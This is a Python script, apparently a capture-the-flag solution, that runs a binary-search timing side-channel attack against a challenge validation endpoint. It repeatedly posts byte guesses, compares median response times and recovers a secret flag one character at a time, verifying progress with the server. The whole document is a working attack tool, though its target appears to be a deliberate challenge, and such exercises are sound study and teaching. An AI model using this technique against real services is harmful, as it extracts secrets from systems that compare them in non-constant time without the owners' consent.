import requests
import time
import statistics

# ===== CONFIGURATION =====
URL = "https://sofia-challenge.vercel.app/api/validate"
ATTEMPTS_PER_TEST = 12      # Number of samples per timing test
MIN_DIFF_MS = 60            # Minimum timing difference to trust (milliseconds)
TIMEOUT = 10                # Request timeout in seconds

# ASCII range for common flag characters
# Covers: 0-9 (48-57), A-Z (65-90), _ (95)
ASCII_LOW = 48
ASCII_HIGH = 95

# ===== GLOBAL STATE =====
recovered = ""

# ===== HELPER FUNCTIONS =====

def test_timing(position, byte_value, attempts):
    """
    Test the timing for a specific byte value at a position.
    Returns the median response time.
    """
    times = []
    
    for _ in range(attempts):
        start = time.perf_counter()
        
        try:
            r = requests.post(
                URL,
                json={
                    "position": position,
                    "checkByte": byte_value
                },
                timeout=TIMEOUT
            )
        except requests.exceptions.RequestException:
            continue  # Skip failed requests
        
        end = time.perf_counter()
        times.append(end - start)
    
    if not times:
        return None
    
    return statistics.median(times)


def binary_search_char(position):
    """
    Use binary search with timing attack to find the character at a given position.
    Returns the discovered character.
    """
    low = ASCII_LOW
    high = ASCII_HIGH
    
    print(f"\n{'='*70}")
    print(f"[Position {position}] Searching for character...")
    print(f"{'='*70}")
    print(f"ASCII range: {low}-{high} ('{chr(low)}' to '{chr(high)}')\n")
    
    iteration = 0
    
    while low < high:
        iteration += 1
        mid = (low + high + 1) // 2
        
        print(f"[Iteration {iteration}] Range: {low}-{high} ({high-low+1} possibilities)")
        print(f"  Testing mid={mid} ('{chr(mid)}')")
        
        # Time the test with mid value
        time_mid = test_timing(position, mid, ATTEMPTS_PER_TEST)
        
        # Time the test with mid-1 for comparison
        time_below = test_timing(position, mid - 1, ATTEMPTS_PER_TEST)
        
        if time_mid is None or time_below is None:
            print("  [!] Request failed, retrying...")
            continue
        
        diff_ms = (time_mid - time_below) * 1000
        
        print(f"  Time(mid={mid}):     {time_mid:.4f}s")
        print(f"  Time(mid-1={mid-1}): {time_below:.4f}s")
        print(f"  Difference:          {diff_ms:+.1f}ms")
        
        # If mid takes significantly longer, the actual char >= mid
        if diff_ms > MIN_DIFF_MS:
            print(f"  → Decision: actual char >= {mid} ('{chr(mid)}')")
            low = mid
        else:
            print(f"  → Decision: actual char < {mid} ('{chr(mid)}')")
            high = mid - 1
        
        print()
    
    found_char = chr(low)
    print(f"[✓] Found character at position {position}: '{found_char}' (ASCII {low})")
    
    return found_char


def verify_flag(flag):
    """
    Verify the complete flag with the server.
    Returns the status from the server response.
    """
    try:
        r = requests.post(
            URL,
            json={"flag": flag},
            timeout=TIMEOUT
        )
        data = r.json()
        return data.get("status"), data.get("message")
    except Exception as e:
        print(f"[!] Verification request failed: {e}")
        return None, None


# ===== MAIN ATTACK LOOP =====

def main():
    global recovered
    
    print("="*70)
    print(" BINARY SEARCH TIMING ATTACK")
    print("="*70)
    print(f"Target: {URL}")
    print(f"Samples per test: {ATTEMPTS_PER_TEST}")
    print(f"Timing threshold: {MIN_DIFF_MS}ms")
    print("="*70)
    
    position = 0
    
    while True:
        # Find the character at current position
        char = binary_search_char(position)
        recovered += char
        
        print(f"\n{'='*70}")
        print(f"[PROGRESS] {recovered}")
        print(f"{'='*70}\n")
        
        # Verify with server
        print("[*] Verifying with server...")
        status, message = verify_flag(recovered)
        
        if status == "success":
            print(f"\n{'='*70}")
            print(f"🎉 FLAG CAPTURED: {recovered}")
            print(f"{'='*70}")
            break
        elif status == "partial":
            print(f"[✓] Correct so far! Continuing to next character...\n")
        elif status == "error":
            print(f"[⚠️] Server returned error: {message}")
            print(f"[⚠️] But continuing anyway (might be incomplete)...\n")
        else:
            print(f"[?] Unknown status: {status}\n")
        
        position += 1
        
        # Safety limit
        if position > 30:
            print("\n[!] Reached maximum length limit (30 characters)")
            print(f"[!] Recovered so far: {recovered}")
            break
        
        # Small delay between positions
        time.sleep(0.5)
    
    print(f"\n[FINAL RESULT] {recovered}")
    print(f"[TOTAL LENGTH] {len(recovered)} characters")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n[!] Attack interrupted by user")
        print(f"[!] Recovered so far: {recovered}")
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        print(f"[!] Recovered so far: {recovered}")